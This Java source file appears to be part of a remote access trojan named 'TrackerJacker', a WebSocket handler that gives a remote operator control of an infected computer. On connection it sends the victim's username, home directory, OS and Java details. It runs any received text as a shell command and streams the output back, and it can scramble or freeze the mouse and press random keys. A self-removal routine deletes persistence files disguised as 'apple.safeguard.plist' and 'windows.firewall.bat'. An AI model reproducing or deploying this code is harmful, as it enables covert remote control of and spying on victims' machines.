package track.er.ja.cker;

import java.awt.Robot;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Random;

import org.eclipse.jetty.websocket.api.Session;
import org.eclipse.jetty.websocket.api.annotations.OnWebSocketClose;
import org.eclipse.jetty.websocket.api.annotations.OnWebSocketConnect;
import org.eclipse.jetty.websocket.api.annotations.OnWebSocketError;
import org.eclipse.jetty.websocket.api.annotations.OnWebSocketMessage;
import org.eclipse.jetty.websocket.api.annotations.WebSocket;

@WebSocket
public class TrackerJackerWebSocketHandler {
	
	private Session session;
	private Process p;
	private BufferedReader input;
	private String line;
	
	@OnWebSocketClose
	public void onClose(int statusCode, String reason) {
	    TrackerJacker.debug("Close: statusCode=" + statusCode + ", reason=" + reason);
	}
	
	@OnWebSocketError
	public void onError(Throwable t) {
	    TrackerJacker.debug("Error: " + t.getMessage());
	}
	
	@OnWebSocketConnect
	public void onConnect(Session session) {
		TrackerJacker.debug("Connect: " + session.getRemoteAddress().getAddress());
		this.session = session;
		
		try {
			
			session.getRemote().sendString("[[;#fff;]Username:] " + TrackerJacker.username);
			session.getRemote().sendString("[[;#fff;]User Working Directory:] " + TrackerJacker.user_dir);
			session.getRemote().sendString("[[;#fff;]User Home Directory:] " + TrackerJacker.user_home);
			session.getRemote().sendString("[[;#fff;]OS:] " + TrackerJacker.OS);
			session.getRemote().sendString("[[;#fff;]OS Version:] " + TrackerJacker.OS_VERSION);
			session.getRemote().sendString("[[;#fff;]OS Architecture:] " + TrackerJacker.OS_ARCH);
			session.getRemote().sendString("[[;#fff;]Java Home:] " + TrackerJacker.java_home);
			session.getRemote().sendString("[[;#fff;]Java Version:] " + TrackerJacker.java_version);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	@OnWebSocketMessage
	public void onMessage(String message) {
	    TrackerJacker.debug("Command: "+ message);
	    
	    if(message.contains("crazyMouse") || message.contains("crazyKeyboard") || message.contains("freezeMouse")){
	    	final String[] cmds = message.split(" ");
	    	if(cmds.length <= 1){return;}
			if(cmds[0].equalsIgnoreCase("crazyMouse")){
				new Thread(){
					public void run(){
						try {
							crazyMouse(Integer.parseInt(cmds[1]));
						} catch (Exception e) {
							return;
						}
					}
				}.start();
			}else if(cmds[0].equalsIgnoreCase("crazyKeyboard")){
				new Thread(){
					public void run(){
						try {
							crazyKeyBoard(Integer.parseInt(cmds[1]));
						} catch (Exception e) {
							return;
						}
					}
				}.start();
			}else if(cmds[0].equalsIgnoreCase("freezeMouse")){
				new Thread(){
					public void run(){
						try {
							freezeMouse(Integer.parseInt(cmds[1]));
						} catch (Exception e) {
							return;
						}
					}
				}.start();
			}
	    } if(message.equals("disinfection")){
	    	//delete itself
	    	new File(TrackerJacker.getCurrentFile()).deleteOnExit();
	    	
	    	File autoStart = null;
	    	
	    	if(OSDetect.isMac()){
	    		autoStart=new File("/Users/"+TrackerJacker.username+"/Library/LaunchAgents/apple.safeguard.plist");
	    	}else if(OSDetect.isWindows()){
	    		autoStart=new File("C:\\Users\\"+TrackerJacker.username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows.firewall.bat");
	    	}
	    	if(autoStart!=null){autoStart.deleteOnExit();}
	    	
	    	System.exit(0);
	    }else{
	    	try {
		    	if(OSDetect.isWindows()){
		    		message = "cmd /c \"" + message + "\"";
		    	}
				p = Runtime.getRuntime().exec(message);
				input = new BufferedReader(new InputStreamReader(p.getInputStream()));
		        line = null; 

		        try {
		            while ((line = input.readLine()) != null) {
		                session.getRemote().sendString(line);
		            }
		        } catch (IOException e) {
		            e.printStackTrace();
		        }
			} catch (IOException e) {
				e.printStackTrace();
			}
	    }
	}
	
	public void crazyMouse(int time) throws Exception{
		long timeStamp = System.currentTimeMillis() + time;
		Robot ro = new Robot();
		Random r = new Random();
		while(System.currentTimeMillis() < timeStamp){
			ro.mouseMove(r.nextInt(2000), r.nextInt(1500));
			Thread.sleep(250);
		}
	}
	
	public void freezeMouse(int time) throws Exception{
		long timeStamp = System.currentTimeMillis() + time;
		Robot ro = new Robot();
		while(System.currentTimeMillis() < timeStamp){
			ro.mouseMove(0, 0);
		}
	}
	
	public void crazyKeyBoard(int time) throws Exception {
		long timeStamp = System.currentTimeMillis() + time;
		Robot ro = new Robot();
		Random r = new Random();
		int key;
		while(System.currentTimeMillis() < timeStamp){
			key = r.nextInt(150);
			ro.keyPress(key);
			ro.keyRelease(key);
			Thread.sleep(150);
		}
	}
}
